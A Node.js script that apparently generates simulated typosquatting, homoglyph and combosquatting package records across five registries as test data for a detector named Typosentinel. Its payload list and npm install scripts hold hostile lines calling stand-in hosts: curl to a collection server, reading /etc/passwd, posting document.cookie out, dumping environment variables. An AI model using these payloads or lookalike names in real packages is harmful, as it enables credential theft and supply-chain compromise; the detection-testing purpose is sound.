#!/usr/bin/env node
/**
 * Zero-Day Typosquatting Attack Simulation
 * 
 * This script simulates various typosquatting attacks across different package registries
 * to test Typosentinel's detection capabilities in real-world scenarios.
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');

class TyposquattingAttackSimulator {
    constructor() {
        this.attackVectors = {
            npm: {
                legitimate: ['react', 'lodash', 'express', 'axios', 'moment'],
                typosquats: ['reactt', 'lodaash', 'expresss', 'axioss', 'momment'],
                homoglyphs: ['rеact', 'lοdash', 'еxpress', 'аxios', 'mοment'], // Contains Cyrillic chars
                combosquats: ['react-utils', 'lodash-extra', 'express-middleware', 'axios-client', 'moment-timezone-fix']
            },
            pypi: {
                legitimate: ['requests', 'numpy', 'pandas', 'flask', 'django'],
                typosquats: ['reqeusts', 'numpyy', 'pandass', 'flaskk', 'djangoo'],
                homoglyphs: ['rеquests', 'numрy', 'рandas', 'flаsk', 'djаngo'],
                combosquats: ['requests-oauthlib-fix', 'numpy-financial-extra', 'pandas-profiling-enhanced']
            },
            maven: {
                legitimate: ['org.springframework:spring-core', 'com.fasterxml.jackson.core:jackson-core'],
                typosquats: ['org.springframework:spring-coree', 'com.fasterxml.jackson.core:jackson-coree'],
                homoglyphs: ['οrg.springframework:spring-core', 'cοm.fasterxml.jackson.core:jackson-core'],
                combosquats: ['org.springframework:spring-core-utils', 'com.fasterxml.jackson.core:jackson-core-extra']
            },
            nuget: {
                legitimate: ['Newtonsoft.Json', 'Microsoft.Extensions.Logging', 'AutoMapper'],
                typosquats: ['Newtonsoft.Jsonn', 'Microsoft.Extensions.Loggingg', 'AutoMapperr'],
                homoglyphs: ['Nеwtonsoft.Json', 'Micrοsoft.Extensions.Logging', 'АutoMapper'],
                combosquats: ['Newtonsoft.Json.Extensions', 'Microsoft.Extensions.Logging.Extra']
            },
            rubygems: {
                legitimate: ['rails', 'devise', 'sidekiq', 'puma', 'nokogiri'],
                typosquats: ['railss', 'devisee', 'sidekiqq', 'pumaa', 'nokogirii'],
                homoglyphs: ['rаils', 'dеvise', 'sidеkiq', 'рuma', 'nοkogiri'],
                combosquats: ['rails-admin-extra', 'devise-security-enhanced', 'sidekiq-monitoring']
            }
        };
        
        this.maliciousPayloads = [
            'eval(atob("Y29uc29sZS5sb2coXCJNYWxpY2lvdXMgY29kZSBleGVjdXRlZFwiKQ=="))', // Base64 encoded console.log
            'require("child_process").exec("curl -s http://malicious-server.com/collect")',
            'process.env.NODE_ENV && require("fs").readFileSync("/etc/passwd")',
            'window.location = "http://phishing-site.com/steal-credentials"',
            'document.cookie && fetch("http://data-exfil.com/", {method: "POST", body: document.cookie})'
        ];
        
        this.outputDir = path.join(__dirname, 'attack-artifacts');
        this.ensureOutputDir();
    }
    
    ensureOutputDir() {
        if (!fs.existsSync(this.outputDir)) {
            fs.mkdirSync(this.outputDir, { recursive: true });
        }
    }
    
    generateMaliciousPackage(registry, packageName, attackType) {
        const timestamp = new Date().toISOString();
        const packageId = crypto.randomBytes(8).toString('hex');
        
        const packageData = {
            id: packageId,
            name: packageName,
            registry: registry,
            attackType: attackType,
            timestamp: timestamp,
            payload: this.maliciousPayloads[Math.floor(Math.random() * this.maliciousPayloads.length)],
            metadata: this.generatePackageMetadata(registry, packageName),
            suspiciousIndicators: this.generateSuspiciousIndicators()
        };
        
        return packageData;
    }
    
    generatePackageMetadata(registry, packageName) {
        const metadata = {
            version: this.generateSuspiciousVersion(),
            description: this.generateSuspiciousDescription(packageName),
            author: this.generateSuspiciousAuthor(),
            homepage: this.generateSuspiciousHomepage(),
            repository: this.generateSuspiciousRepository(),
            keywords: this.generateSuspiciousKeywords(packageName),
            dependencies: this.generateSuspiciousDependencies(registry)
        };
        
        // Registry-specific metadata
        switch (registry) {
            case 'npm':
                metadata.main = 'index.js';
                metadata.scripts = {
                    'preinstall': 'node -e "console.log(process.env)"',
                    'postinstall': 'curl -s http://malicious-server.com/installed'
                };
                break;
            case 'pypi':
                metadata.setup_requires = ['setuptools', 'wheel', 'suspicious-setup-tool'];
                metadata.install_requires = ['requests', 'malicious-dependency'];
                break;
            case 'maven':
                metadata.groupId = 'com.suspicious';
                metadata.artifactId = packageName.split(':')[1] || packageName;
                break;
            case 'nuget':
                metadata.targetFramework = 'netstandard2.0';
                metadata.packageTypes = ['Dependency'];
                break;
            case 'rubygems':
                metadata.platform = 'ruby';
                metadata.executables = ['suspicious-binary'];
                break;
        }
        
        return metadata;
    }
    
    generateSuspiciousVersion() {
        // Generate versions that might bypass security checks
        const suspiciousVersions = [
            '1.0.0-alpha.1',
            '0.0.1-beta',
            '999.999.999',
            '1.0.0+build.1',
            '2.0.0-rc.1'
        ];
        return suspiciousVersions[Math.floor(Math.random() * suspiciousVersions.length)];
    }
    
    generateSuspiciousDescription(packageName) {
        const templates = [
            `Enhanced version of ${packageName} with additional features`,
            `${packageName} with security patches and performance improvements`,
            `Community fork of ${packageName} with bug fixes`,
            `Unofficial ${packageName} package with extra utilities`,
            `${packageName} - now with better TypeScript support`
        ];
        return templates[Math.floor(Math.random() * templates.length)];
    }
    
    generateSuspiciousAuthor() {
        const suspiciousAuthors = [
            'security-researcher',
            'community-maintainer',
            'official-team',
            'core-developer',
            'trusted-contributor'
        ];
        return suspiciousAuthors[Math.floor(Math.random() * suspiciousAuthors.length)];
    }
    
    generateSuspiciousHomepage() {
        const domains = [
            'github.io',
            'gitlab.io',
            'bitbucket.org',
            'sourceforge.net',
            'npmjs.com' // Impersonating legitimate domain
        ];
        const subdomain = crypto.randomBytes(4).toString('hex');
        return `https://${subdomain}.${domains[Math.floor(Math.random() * domains.length)]}`;
    }
    
    generateSuspiciousRepository() {
        const platforms = ['github.com', 'gitlab.com', 'bitbucket.org'];
        const username = crypto.randomBytes(4).toString('hex');
        const reponame = crypto.randomBytes(4).toString('hex');
        return `https://${platforms[Math.floor(Math.random() * platforms.length)]}/${username}/${reponame}`;
    }
    
    generateSuspiciousKeywords(packageName) {
        const baseKeywords = packageName.split('-');
        const suspiciousKeywords = [
            'security',
            'patch',
            'fix',
            'enhanced',
            'improved',
            'official',
            'community',
            'trusted'
        ];
        return [...baseKeywords, ...suspiciousKeywords.slice(0, 3)];
    }
    
    generateSuspiciousDependencies(registry) {
        const dependencies = {};
        const suspiciousDeps = {
            npm: ['malicious-logger', 'data-collector', 'env-reader'],
            pypi: ['suspicious-requests', 'data-exfiltrator', 'credential-harvester'],
            maven: ['com.malicious:data-collector', 'org.suspicious:env-reader'],
            nuget: ['Malicious.DataCollector', 'Suspicious.EnvReader'],
            rubygems: ['malicious-gem', 'data-collector-gem']
        };
        
        const registryDeps = suspiciousDeps[registry] || [];
        registryDeps.slice(0, 2).forEach(dep => {
            dependencies[dep] = this.generateSuspiciousVersion();
        });
        
        return dependencies;
    }
    
    generateSuspiciousIndicators() {
        return {
            hasPreInstallScript: Math.random() > 0.5,
            hasPostInstallScript: Math.random() > 0.3,
            hasNetworkCalls: Math.random() > 0.4,
            hasFileSystemAccess: Math.random() > 0.6,
            hasEnvironmentAccess: Math.random() > 0.7,
            hasObfuscatedCode: Math.random() > 0.3,
            hasBase64Encoding: Math.random() > 0.4,
            hasEvalStatements: Math.random() > 0.2,
            hasSuspiciousUrls: Math.random() > 0.5,
            hasTyposquattingPattern: true,
            similarityScore: Math.random() * 0.3 + 0.7, // 70-100% similarity
            levenshteinDistance: Math.floor(Math.random() * 3) + 1
        };
    }
    
    simulateAttackScenario(scenario) {
        console.log(`\n🚨 Simulating ${scenario.toUpperCase()} attack scenario...`);
        
        const attacks = [];
        
        Object.keys(this.attackVectors).forEach(registry => {
            const vectors = this.attackVectors[registry];
            
            // Generate typosquatting attacks
            vectors.typosquats.forEach((typosquat, index) => {
                const legitimate = vectors.legitimate[index];
                const attack = this.generateMaliciousPackage(registry, typosquat, 'typosquatting');
                attack.targetPackage = legitimate;
                attacks.push(attack);
            });
            
            // Generate homoglyph attacks
            vectors.homoglyphs.forEach((homoglyph, index) => {
                const legitimate = vectors.legitimate[index];
                const attack = this.generateMaliciousPackage(registry, homoglyph, 'homoglyph');
                attack.targetPackage = legitimate;
                attacks.push(attack);
            });
            
            // Generate combosquatting attacks
            vectors.combosquats.forEach((combosquat, index) => {
                const legitimate = vectors.legitimate[index % vectors.legitimate.length];
                const attack = this.generateMaliciousPackage(registry, combosquat, 'combosquatting');
                attack.targetPackage = legitimate;
                attacks.push(attack);
            });
        });
        
        return attacks;
    }
    
    saveAttackData(attacks, scenario) {
        const filename = `${scenario}-attacks-${Date.now()}.json`;
        const filepath = path.join(this.outputDir, filename);
        
        const attackData = {
            scenario: scenario,
            timestamp: new Date().toISOString(),
            totalAttacks: attacks.length,
            attacksByRegistry: this.groupAttacksByRegistry(attacks),
            attacksByType: this.groupAttacksByType(attacks),
            attacks: attacks
        };
        
        fs.writeFileSync(filepath, JSON.stringify(attackData, null, 2));
        console.log(`💾 Attack data saved to: ${filepath}`);
        
        return filepath;
    }
    
    groupAttacksByRegistry(attacks) {
        return attacks.reduce((acc, attack) => {
            acc[attack.registry] = (acc[attack.registry] || 0) + 1;
            return acc;
        }, {});
    }
    
    groupAttacksByType(attacks) {
        return attacks.reduce((acc, attack) => {
            acc[attack.attackType] = (acc[attack.attackType] || 0) + 1;
            return acc;
        }, {});
    }
    
    generateAttackReport(attacks) {
        const report = {
            summary: {
                totalAttacks: attacks.length,
                registriesTargeted: Object.keys(this.groupAttacksByRegistry(attacks)).length,
                attackTypes: Object.keys(this.groupAttacksByType(attacks)),
                highRiskAttacks: attacks.filter(a => a.suspiciousIndicators.similarityScore > 0.9).length
            },
            riskAnalysis: {
                criticalRisk: attacks.filter(a => this.calculateRiskScore(a) > 8).length,
                highRisk: attacks.filter(a => this.calculateRiskScore(a) > 6).length,
                mediumRisk: attacks.filter(a => this.calculateRiskScore(a) > 4).length,
                lowRisk: attacks.filter(a => this.calculateRiskScore(a) <= 4).length
            },
            detectionChallenges: {
                homoglyphAttacks: attacks.filter(a => a.attackType === 'homoglyph').length,
                highSimilarityAttacks: attacks.filter(a => a.suspiciousIndicators.similarityScore > 0.95).length,
                obfuscatedPayloads: attacks.filter(a => a.suspiciousIndicators.hasObfuscatedCode).length,
                legitimateLookingMetadata: attacks.filter(a => this.hasLegitimateMetadata(a)).length
            }
        };
        
        return report;
    }
    
    calculateRiskScore(attack) {
        let score = 0;
        const indicators = attack.suspiciousIndicators;
        
        // Base score from similarity
        score += indicators.similarityScore * 3;
        
        // Add points for dangerous capabilities
        if (indicators.hasPreInstallScript) score += 2;
        if (indicators.hasPostInstallScript) score += 1.5;
        if (indicators.hasNetworkCalls) score += 2;
        if (indicators.hasFileSystemAccess) score += 1.5;
        if (indicators.hasEnvironmentAccess) score += 2;
        if (indicators.hasObfuscatedCode) score += 1.5;
        if (indicators.hasEvalStatements) score += 2;
        
        // Reduce score for low Levenshtein distance (easier to detect)
        score -= indicators.levenshteinDistance * 0.5;
        
        return Math.min(10, Math.max(0, score));
    }
    
    hasLegitimateMetadata(attack) {
        const metadata = attack.metadata;
        return (
            metadata.description && !metadata.description.includes('enhanced') &&
            metadata.author && !metadata.author.includes('suspicious') &&
            metadata.homepage && metadata.homepage.includes('github.com')
        );
    }
    
    async runSimulation() {
        console.log('🎯 Starting Zero-Day Typosquatting Attack Simulation');
        console.log('=' .repeat(60));
        
        const scenarios = ['supply-chain', 'dependency-confusion', 'typosquatting-campaign'];
        const allAttacks = [];
        
        for (const scenario of scenarios) {
            const attacks = this.simulateAttackScenario(scenario);
            allAttacks.push(...attacks);
            
            const filepath = this.saveAttackData(attacks, scenario);
            console.log(`✅ Generated ${attacks.length} attacks for ${scenario} scenario`);
        }
        
        // Generate comprehensive report
        const report = this.generateAttackReport(allAttacks);
        const reportPath = path.join(this.outputDir, `attack-simulation-report-${Date.now()}.json`);
        fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
        
        console.log('\n📊 Attack Simulation Summary:');
        console.log(`Total attacks generated: ${report.summary.totalAttacks}`);
        console.log(`Registries targeted: ${report.summary.registriesTargeted}`);
        console.log(`Critical risk attacks: ${report.riskAnalysis.criticalRisk}`);
        console.log(`High similarity attacks: ${report.detectionChallenges.highSimilarityAttacks}`);
        console.log(`\n📋 Full report saved to: ${reportPath}`);
        
        return {
            attacks: allAttacks,
            report: report,
            reportPath: reportPath
        };
    }
}

// CLI execution
if (require.main === module) {
    const simulator = new TyposquattingAttackSimulator();
    simulator.runSimulation().catch(console.error);
}

module.exports = TyposquattingAttackSimulator;